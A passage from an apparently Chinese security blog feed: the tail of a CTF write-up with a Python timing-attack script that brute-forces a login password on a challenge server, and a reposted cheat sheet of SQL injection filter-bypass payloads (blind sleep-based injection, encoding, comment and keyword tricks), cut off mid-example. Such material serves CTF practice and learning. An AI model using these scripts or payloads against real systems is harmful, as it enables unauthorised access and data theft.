class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure></details><p>&#x2F;login目录下存在明显的timing漏洞，可以根据响应时间来分析出密钥。</p><p>理论上来说&#x2F;index目录下的verify_code也是逐字符比较，也可以timing attack。 但是由于字符比较很快，比较一个字符的速度是ns级（甚至更短），而网络波动动辄几十毫秒，甚至上百毫秒，因此很难利用这个比较时间来区分。非要区分的话，要把网络波动控制的很小很小，就要一个密码发很多很多次包取平均，减小网络传输速度本身的方差。但要达到ns级别，在实践上应该是不可行的。</p><p>利用多次发包减小方差的方法实现了密码的爆破。结果是<code>sECurePAsS</code><br>我猜测这个<code>VERIFICATION_CODE</code>应该是用字典爆破。但是尝试了几个字典都没爆破出来，也可能是我选的字典不对。</p><p>等待大佬wp ing</p><details><summary> 爆破密钥脚本: </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> moduleByMekrina <span class="hljs-keyword">import</span> my_ascii_list<br><br>proxies = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8080&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://node2.anna.nssctf.cn:28498/login&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cracker</span>():<br>    length = get_length()<br>    get_password(length)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_next_byte</span>(<span class="hljs-params">current, signal = <span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> signal:<br>        <span class="hljs-keyword">return</span> current<br>    <span class="hljs-keyword">if</span> current == my_ascii_list[-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> my_ascii_list[my_ascii_list.index(current) + <span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>():<br>    data = &#123;<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;\x00&#x27;</span><br>    &#125;<br>    session = requests.Session()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        response = session.post(url=url, data=data)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;密码错误&#x27;</span> <span class="hljs-keyword">in</span> response.text):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;密码长度为: &#x27;</span>,<span class="hljs-built_in">len</span>(data[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(data[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        data[<span class="hljs-string">&#x27;password&#x27;</span>] += <span class="hljs-string">&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_time</span>(<span class="hljs-params">password, n = <span class="hljs-number">10</span></span>):<br>    data = &#123;<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>.join(password)<br>    &#125;<br>    total_time = <span class="hljs-number">0</span><br>    session = requests.Session()<br>    <span class="hljs-comment"># for proxies</span><br>    <span class="hljs-comment"># session.post(url=url,data=data, proxies = proxies)</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        start = time.time_ns()<br>        session.post(url=url,data=data)<br>        end = time.time_ns()<br>        total_time += (end-start)<br>    each_time = total_time / n<br>    <span class="hljs-keyword">return</span> each_time<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_base_time</span>(<span class="hljs-params">password,index</span>):<br>    run_time = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        password[index] = <span class="hljs-built_in">chr</span>(i) <br>        run_time.append(get_time(password=password, n=<span class="hljs-number">30</span>))<br>    base_time = run_time[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> run_time[<span class="hljs-number">0</span>] &lt; run_time[<span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> run_time[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> base_time<br>        <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_password</span>(<span class="hljs-params">length</span>):<br>    password = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;\x11&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>]<br>    <span class="hljs-comment"># password[0],password[1] = &#x27;s&#x27;, &#x27;E&#x27;</span><br>    index = <span class="hljs-number">7</span><br>    base_time = get_base_time(password=password,index=index)<br>    password[index] = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_time: &quot;</span>, base_time // (<span class="hljs-number">10</span> ** <span class="hljs-number">6</span>), <span class="hljs-string">&quot; ms&quot;</span>)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        signal = <span class="hljs-literal">False</span><br>        run_time = get_time(password=password)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;trying the <span class="hljs-subst">&#123;index&#125;</span> byte: &quot;</span>, password[index].encode(), <span class="hljs-string">&quot;  run_time: &quot;</span>, run_time // <span class="hljs-number">10</span>**<span class="hljs-number">6</span> , <span class="hljs-string">&quot;ms&quot;</span>)<br>        <span class="hljs-keyword">if</span>(run_time - base_time &gt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;the <span class="hljs-subst">&#123;index&#125;</span> byte supposed to be <span class="hljs-subst">&#123;password[index].encode()&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying to confirm it: &#x27;</span>)<br>            <br>            run_time = get_time(password, n=<span class="hljs-number">30</span>)<br>            <span class="hljs-keyword">if</span>(run_time - base_time &lt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;confirm failed, trying next...&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;confirmed&#x27;</span>)<br>                base_time = run_time<br>                index += <span class="hljs-number">1</span><br>                signal = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">if</span>(index == length - <span class="hljs-number">1</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;done&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span>(base_time - run_time &gt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the last byte maybe mistaken&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;trying to confirm it&quot;</span>)<br>            run_time = get_time(password, n=<span class="hljs-number">30</span>)<br>            <span class="hljs-keyword">if</span>(base_time - run_time &lt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;runtime: &quot;</span>, run_time ,<span class="hljs-string">&quot;confirm failed, continue&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; confirmed, going back...&quot;</span>)<br>                base_time = run_time<br>                index = index - <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span>(index &lt; <span class="hljs-number">0</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the internet is not stable... stop&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>        next_byte = get_next_byte(current=password[index], signal=signal)<br>        <span class="hljs-keyword">if</span>(next_byte == <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;next_byte: none&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br>        password[index] = next_byte<br>    <span class="hljs-built_in">print</span>(password)<br>    <span class="hljs-keyword">return</span> password<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    length = get_length()<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> my_ascii_list:<br>        runtime = get_time(password=char*length)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;test char : &#x27;</span>, char.encode(), <span class="hljs-string">&quot;runtime: &quot;</span> , runtime // <span class="hljs-number">10</span>**<span class="hljs-number">3</span>, <span class="hljs-string">&quot; us &quot;</span>)<br>        <br>cracker()<br><span class="hljs-comment">#test()</span><br><br><span class="hljs-comment"># sECurePAsS</span><br></code></pre></td></tr></table></figure></details>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入绕过</title>
    <link href="/blogs/sql/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <url>/blogs/sql/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>转载并修改自 <a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87-1">链接</a></p><h1 id="SQL注入针对关键字过滤的绕过技巧"><a href="#SQL注入针对关键字过滤的绕过技巧" class="headerlink" title="SQL注入针对关键字过滤的绕过技巧"></a>SQL注入针对关键字过滤的绕过技巧</h1><p>在SQL注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p><span id="more"></span><blockquote><p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加SQL注入过滤和检测的几种思路和绕过方法</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><h3 id="使用注释符-绕过"><a href="#使用注释符-绕过" class="headerlink" title="使用注释符/**/绕过"></a>使用注释符<code>/**/</code>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>name<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">table</span><br></code></pre></td></tr></table></figure><h3 id="使用url编码绕过"><a href="#使用url编码绕过" class="headerlink" title="使用url编码绕过"></a>使用<strong>url编码</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span>a0 发出去就是空格的意思，但是需要在burp中抓包后修改<br></code></pre></td></tr></table></figure><h3 id="使用浮点数绕过"><a href="#使用浮点数绕过" class="headerlink" title="使用浮点数绕过"></a>使用<strong>浮点数</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8E0</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>等价于<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8.0</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="使用Tab替代空格"><a href="#使用Tab替代空格" class="headerlink" title="使用Tab替代空格"></a>使用<strong>Tab</strong>替代空格</h3><h3 id="使用两个空格替代一个空格"><a href="#使用两个空格替代一个空格" class="headerlink" title="使用两个空格替代一个空格"></a>使用<strong>两个空格</strong>替代一个空格</h3><h3 id="使用括号绕过"><a href="#使用括号绕过" class="headerlink" title="使用括号绕过"></a>使用<strong>括号</strong>绕过</h3><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。<br>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>(<span class="hljs-keyword">user</span>())<span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span>(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-keyword">and</span>(<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span>(sleep(ascii(mid(database()<span class="hljs-keyword">from</span>(<span class="hljs-number">1</span>)<span class="hljs-keyword">for</span>(<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">109</span>))<span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><h3 id="使用16进制绕过"><a href="#使用16进制绕过" class="headerlink" title="使用16进制绕过"></a>使用<strong>16进制</strong>绕过</h3><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条SQL语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。<br><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的SQL语句就变为了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><h3 id="使用from关键字绕过"><a href="#使用from关键字绕过" class="headerlink" title="使用from关键字绕过"></a>使用<strong>from关键字</strong>绕过</h3><p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> mid(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h3 id="使用join关键字绕过"><a href="#使用join关键字绕过" class="headerlink" title="使用join关键字绕过"></a>使用<strong>join关键字</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br>等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b<br></code></pre></td></tr></table></figure><h3 id="使用like关键字绕过"><a href="#使用like关键字绕过" class="headerlink" title="使用like关键字绕过"></a>使用<strong>like关键字</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> ascii(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">80</span>   #等价于<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;r%&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="使用offset关键字绕过"><a href="#使用offset关键字绕过" class="headerlink" title="使用offset关键字绕过"></a>使用<strong>offset关键字</strong>绕过</h3><p>对于limit可以使用offset来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br>等价于<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="过滤注释符（-和-）"><a href="#过滤注释符（-和-）" class="headerlink" title="过滤注释符（ # 和 -- ）"></a>过滤注释符（ <code>#</code> 和 <code>--</code> ）</h2><h3 id="手动闭合引号，不使用注释符"><a href="#手动闭合引号，不使用注释符" class="headerlink" title="手动闭合引号，不使用注释符"></a>手动闭合引号，不使用注释符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3||&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,&#x27;</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="过滤比较符号-（-）"><a href="#过滤比较符号-（-）" class="headerlink" title="过滤比较符号 （ &lt; 和 &gt; ）"></a>过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h2><h3 id="使用-greatest-、least（）函数-绕过"><a href="#使用-greatest-、least（）函数-绕过" class="headerlink" title="使用**greatest()、least（）函数**绕过"></a>使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3><p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p><p>最常见的一个盲注的SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值</p><p>那么上面的这条SQL语句可以使用greatest变为如下的子句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><h3 id="使用-between-and-绕过"><a href="#使用-between-and-绕过" class="headerlink" title="使用**between and**绕过"></a>使用**<code>between</code> <code>and</code>**绕过</h3><p>between a and b：返回a，b之间的数据，不包含b。</p><h2 id="过滤等号（-）"><a href="#过滤等号（-）" class="headerlink" title="过滤等号（ = ）"></a>过滤等号（ <code>=</code> ）</h2><h3 id="使用like-、rlike-、regexp-或者-使用-或者"><a href="#使用like-、rlike-、regexp-或者-使用-或者" class="headerlink" title="使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;"></a>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</h3><h2 id="过滤or-and-xor-not"><a href="#过滤or-and-xor-not" class="headerlink" title="过滤or and xor not"></a>过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2><h3 id="使用符号代替"><a href="#使用符号代替" class="headerlink" title="使用符号代替"></a>使用符号代替</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span><span class="hljs-operator">=</span>`<span class="hljs-operator">&amp;&amp;</span>`  <span class="hljs-keyword">or</span><span class="hljs-operator">=</span>`<span class="hljs-operator">||</span>`   xor<span class="hljs-operator">=</span>`<span class="hljs-operator">|</span>`   <span class="hljs-keyword">not</span><span class="hljs-operator">=</span>`<span class="hljs-operator">!</span>`<br></code></pre></td></tr></table></figure><h2 id="过滤union，select，where等"><a href="#过滤union，select，where等" class="headerlink" title="过滤union，select，where等"></a>过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2><h3 id="使用大小写绕过"><a href="#使用大小写绕过" class="headerlink" title="使用大小写绕过"></a>使用<strong>大小写</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UnIoN/**/SeLeCT</span><br></code></pre></td></tr></table></figure><h3 id="使用内联注释绕过（–暂时不知道有什么用。。。"><a href="#使用内联注释绕过（–暂时不知道有什么用。。。" class="headerlink" title="使用内联注释绕过（–暂时不知道有什么用。。。:)"></a>使用<strong>内联注释</strong>绕过（–暂时不知道有什么用。。。:)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></code></pre></td></tr></table></figure><h3 id="使用双关键字绕过（若删除掉第一个匹配的union就能绕过）"><a href="#使用双关键字绕过（若删除掉第一个匹配的union就能绕过）" class="headerlink" title="使用双关键字绕过（若删除掉第一个匹配的union就能绕过）"></a>使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></code></pre></td></tr></table></figure><h3 id="使用加号-拆解字符串"><a href="#使用加号-拆解字符串" class="headerlink" title="使用加号+拆解字符串"></a>使用<strong>加号+拆解字符串</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> ‘swords’ <span class="hljs-operator">=</span>‘sw’ <span class="hljs-operator">+</span>’ ords’ ；<span class="hljs-keyword">EXEC</span>(‘<span class="hljs-keyword">IN</span>’ <span class="hljs-operator">+</span>’ SERT <span class="hljs-keyword">INTO</span> ‘<span class="hljs-operator">+</span>’ …..’ )<br></code></pre></td></tr></table></figure><h3 id="使用语法新特性绕过屏蔽select"><a href="#使用语法新特性绕过屏蔽select" class="headerlink" title="使用语法新特性绕过屏蔽select"></a>使用语法新特性绕过屏蔽select</h3><p>在MySQL 8.0.19版本后，MySQL推出了一些新特性，使我们可以不使用select就能够取数据</p><h4 id="TABLE-语句"><a href="#TABLE-语句" class="headerlink" title="TABLE 语句"></a>TABLE 语句</h4><p>可以直接列出表的全部内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">TABLE</span> table_name [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name] [LIMIT number [<span class="hljs-keyword">OFFSET</span> number]]<br></code></pre></td></tr></table></figure><p>如 <code>select * from user</code> 就可以用 <code>table user</code> 替代来进行绕过</p><h4 id="VALUES-语句"><a href="#VALUES-语句" class="headerlink" title="VALUES 语句"></a>VALUES 语句</h4><p>可以列出一行的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">VALUES</span> row_constructor_list [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_designator] [LIMIT <span class="hljs-keyword">BY</span> number]<br><br>row_constructor_list:<br> <span class="hljs-type">ROW</span>(value_list)[, <span class="hljs-type">ROW</span>(value_list)][, 